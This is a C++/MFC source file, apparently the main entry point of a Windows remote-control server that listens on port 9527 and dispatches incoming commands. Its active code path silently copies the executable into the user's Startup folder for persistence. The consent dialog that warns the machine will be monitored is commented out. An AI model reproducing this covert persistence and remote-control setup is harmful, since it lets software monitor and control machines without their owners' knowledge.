#include "pch.h"
#include "framework.h"
#include "remoteControlServer.h"
#include"ServerSocket.h"
#include"CCommandEx.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 唯一的应用程序对象

CWinApp theApp;
using namespace std;

//设置为启动项自动启动
void startup()
{
	//获取启动项目录位置
	TCHAR pathdis[MAX_PATH];
	if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, pathdis) != S_OK)
	{
		return;
	}
	CString pathDist = CString(pathdis) + "\\remoteControlServer.exe";
	//获取当前程序位置  如果没有参数命令行参数那么也可以用  CString pathsou=GetCommandLine();但是这个字符串带上了双引号
	char pathsou[MAX_PATH];
	GetModuleFileName(NULL, pathsou, MAX_PATH);
	CString pathSource(pathsou);
	if (PathFileExists(pathDist))//如果存在直接返回
	{
		return;
	}
	int ret=CopyFile(pathSource, pathDist, FALSE);//FALSE表示如果存在则覆盖
	if (ret == FALSE)
	{
		MessageBox(NULL, _T("设置开机自启动失败！是否权限不足？\r\n程序启动失败"), _T("错误"), MB_ICONERROR | MB_TOPMOST);
	}
}
//选择开机自启动
void ChooseAutoInvoke()
{
	TCHAR sysDir[MAX_PATH];
	GetSystemDirectory(sysDir,MAX_PATH);
	CString strPath = CString(sysDir)+CString(_T("\\SysWOW64\\remoteControlServer.exe"));
	if(PathFileExists(strPath))
	{
		return;
	}
	CString  strSubKey = _T("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
	CString strInfo = _T("该程序只允许用于合法用途!\n");
	strInfo += _T("继续运行该程序,将使得这台机器处于被监控状态!\n");
	strInfo += _T("如果你不希望这样,请按取消，退出程序\n");
	strInfo += _T("按下“是”按钮,该程序将被复制到你的系统目录下，并随系统启动而启动\n");
	strInfo += _T("按下“否”按钮，该程序只运行一次，不会在系统目录留下任何东西\n");
	int ret = MessageBox(NULL, strInfo, _T("警告"), MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);
	if (ret == IDYES)
	{
		char sPath[MAX_PATH] = "";
		char sSys[MAX_PATH] = "";
		std::string strExe = "\\remoteControlServer.exe";
		GetCurrentDirectoryA(MAX_PATH, sPath);
		GetSystemDirectoryA(sSys, sizeof(sSys));
		std::string strCmd = "mklink " + std::string(sSys) + strExe + " "+std::string(sPath) + strExe;
		system(strCmd.c_str());
		HKEY hKey = NULL;
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, strSubKey, 0, KEY_WRITE, &hKey);
		if (ret != ERROR_SUCCESS) {
			RegCloseKey(hKey);
			MessageBox(NULL, _T("设置开机自启动失败！是否权限不足？\r\n程序启动失败"), _T("错误"), MB_ICONERROR | MB_TOPMOST);
			exit(0);
		}
		ret = RegSetValueEx(hKey, _T("remoteControlServer"), 0, REG_EXPAND_SZ, (BYTE*)(LPCTSTR)strPath, strPath.GetLength()*sizeof(TCHAR));
		if (ret != ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			MessageBox(NULL, _T("设置开机自启动失败！是否权限不足？\r\n程序启动失败"), _T("错误"), MB_ICONERROR | MB_TOPMOST);
			exit(0);
		}
		RegCloseKey(hKey);
	}
	else if (ret == IDCANCEL)
	{
		exit(0);
	}
	return;
}


int main()
{
	int nRetCode = 0;
	HMODULE hModule = ::GetModuleHandle(nullptr);
	CCommandEx cmd;
	if (hModule != nullptr)
	{
		// 初始化 MFC 并在失败时显示错误
		if (!AfxWinInit(hModule, nullptr, ::GetCommandLine(), 0))
		{
			// TODO: 在此处为应用程序的行为编写代码。
			wprintf(L"错误: MFC 初始化失败\n");
			nRetCode = 1;
		}
		else
		{
		//	ChooseAutoInvoke();
			startup();
			CServerSocket* pServer = CServerSocket::getServerSocketInstance();
			int ret = pServer->run(&CCommandEx::runCommand, (void*)&cmd, 9527);
			if (ret == 1 || ret == 2)
			{
				AfxMessageBox("网络初始化错误,请检查网络");
			}
		}
	}
	else
	{
		// TODO: 更改错误代码以符合需要
		wprintf(L"错误: GetModuleHandle 失败\n");
		nRetCode = 1;
	}
	return nRetCode;

}